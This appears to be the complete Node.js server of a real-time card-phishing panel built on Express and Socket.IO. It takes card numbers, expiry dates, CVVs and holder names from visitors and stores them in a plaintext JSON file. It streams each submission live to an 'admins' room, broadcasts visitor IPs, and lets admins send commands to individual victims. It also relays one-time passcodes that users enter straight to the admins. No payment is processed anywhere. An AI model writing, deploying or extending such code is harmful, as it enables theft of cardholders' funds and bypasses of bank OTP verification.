
const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// Enhanced CORS configuration for production
app.use(cors({
  origin: ['https://dev49.onrender.com', 'http://localhost:8080', 'http://localhost:5173'],
  credentials: true
}));

const port = process.env.PORT || 8080;
const server = http.createServer(app);

// Enhanced Socket.IO configuration
const io = new Server(server, {
  cors: {
    origin: ['https://dev49.onrender.com', 'http://localhost:8080', 'http://localhost:5173'],
    methods: ['GET', 'POST'],
    credentials: true
  },
  upgradeTimeout: 30000,
  transports: ['websocket', 'polling']
});

// Middleware for parsing JSON
app.use(express.json());

// In-memory storage for card submissions
const submissionsFilePath = path.join(__dirname, 'submissions.json');
let cardSubmissionsQueue = [];

// Function to load submissions from file
const loadSubmissions = () => {
  try {
    if (fs.existsSync(submissionsFilePath)) {
      const data = fs.readFileSync(submissionsFilePath, 'utf8');
      cardSubmissionsQueue = JSON.parse(data);
      console.log(`[Server] Loaded ${cardSubmissionsQueue.length} submissions from file.`);
    }
  } catch (error) {
    console.error('[Server] Error loading submissions from file:', error);
  }
};

// Function to save submissions to file
const saveSubmissions = () => {
  try {
    fs.writeFileSync(submissionsFilePath, JSON.stringify(cardSubmissionsQueue, null, 2), 'utf8');
    console.log('[Server] Submissions saved to file.');
  } catch (error) {
    console.error('[Server] Error saving submissions to file:', error);
  }
};

// Load submissions when the server starts
loadSubmissions();

// Socket.IO connection handling
io.on('connection', (socket) => {
  console.log(`[Server] Socket.IO connection established: ${socket.id}`);
  
  socket.on('disconnect', (reason) => {
    console.log(`[Server] Socket.IO disconnected: ${socket.id}, reason: ${reason}`);
  });

  // Global broadcast for any new connection
  const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
  console.log(`[Server] Client connected: ${socket.id} from ${clientIp}`);
  io.emit('visitor_update', {
    id: socket.id,
    ip: clientIp,
    created_at: new Date().toISOString()
  });

  // Handler for an admin identifying themselves
  socket.on('admin_hello', () => {
    socket.join('admins');
    console.log(`[Server] Admin connected: ${socket.id}`);

    // Send all queued card submissions to the newly connected admin
    cardSubmissionsQueue.forEach(submission => {
      socket.emit('card_submission', submission);
    });
  });

  // Handler for card data from a user
  socket.on('card_submission', (payload) => {
    // Validate required fields
    const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
    const missingFields = requiredFields.filter(field => !payload[field]);
    
    if (missingFields.length > 0) {
      console.error('Missing required fields:', missingFields);
      return;
    }

    // Format the submission data
    const submissionPayload = {
      id: socket.id,
      socket_id: socket.id,
      ...payload,
      user_ip: clientIp,
      created_at: new Date().toISOString(),
      status: 'pending'
    };

    // Add card type detection
    const cardNumber = payload.card_number.replace(/\s/g, '');
    submissionPayload.card_type = detectCardType(cardNumber);

    // Add the submission to the in-memory queue
    cardSubmissionsQueue.push(submissionPayload);
    saveSubmissions();
    console.log(`[Server] Card submission received and queued. Queue size: ${cardSubmissionsQueue.length}`);

    // Send the data ONLY to admins
    io.to('admins').emit('card_submission', submissionPayload);
  });

  // Helper function to detect card type
  function detectCardType(cardNumber) {
    if (cardNumber.startsWith('4')) return 'Visa';
    if (cardNumber.startsWith('5')) return 'MasterCard';
    if (cardNumber.startsWith('6')) return 'Discover';
    if (cardNumber.startsWith('3')) return 'American Express';
    return 'Unknown';
  }

  // Handler for commands from an admin
  socket.on('admin_command', (payload) => {
    io.to('admins').emit('admin_command', payload);

    const targetSocketId = payload.submission_id;
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket) {
        targetSocket.emit('admin_command', payload);
      }
    }
  });

  // Handler for OTPs from a user
  socket.on('otp_submitted', (payload) => {
    console.log(`[Server] Received otp_submitted from ${socket.id} for submission_id: ${payload.submission_id}, OTP: ${payload.otp}`);
    const otpPayload = {
      ...payload,
      submission_id: payload.submission_id,
      otp: payload.otp
    };
    io.to('admins').emit('otp_submitted', otpPayload);
  });

  // Chat handlers
  socket.on('chat_message', (payload) => {
    io.emit('chat_message', payload);
  });

  socket.on('start_chat', (payload) => {
    io.emit('start_chat', payload);
  });

  // Global broadcast for a client disconnecting
  socket.on('disconnect', () => {
    io.emit('visitor_left', { id: socket.id });
  });
});

// Serve static files from the dist directory (built React app)
const distPath = path.join(__dirname, 'dist');
console.log('[Server] Serving static files from:', distPath);

// Check if dist directory exists
if (fs.existsSync(distPath)) {
  app.use(express.static(distPath, {
    maxAge: '1y',
    etag: false
  }));
  console.log('[Server] Static files configured successfully');
} else {
  console.warn('[Server] Warning: dist directory not found at:', distPath);
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'OK', timestamp: new Date().toISOString() });
});

// API endpoint for submissions (if needed)
app.get('/api/submissions', (req, res) => {
  res.json({ count: cardSubmissionsQueue.length });
});

// Catch-all handler: send back React's index.html file for client-side routing
app.get('*', (req, res) => {
  const indexPath = path.join(distPath, 'index.html');
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.status(404).send('Application not built. Please run build process.');
  }
});

// Enhanced error handling
server.on('error', (error) => {
  console.error('[Server] Server error:', error);
});

server.on('upgrade', (req, socket, head) => {
  console.log('[Server] HTTP Upgrade request received:', req.url);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('[Server] SIGTERM received, shutting down gracefully');
  server.close(() => {
    console.log('[Server] Process terminated');
  });
});

process.on('SIGINT', () => {
  console.log('[Server] SIGINT received, shutting down gracefully');
  server.close(() => {
    console.log('[Server] Process terminated');
  });
});

// Start server
server.listen(port, '0.0.0.0', () => {
  console.log(`[Server] Server is running on port ${port}`);
  console.log(`[Server] Environment: ${process.env.NODE_ENV || 'development'}`);
});
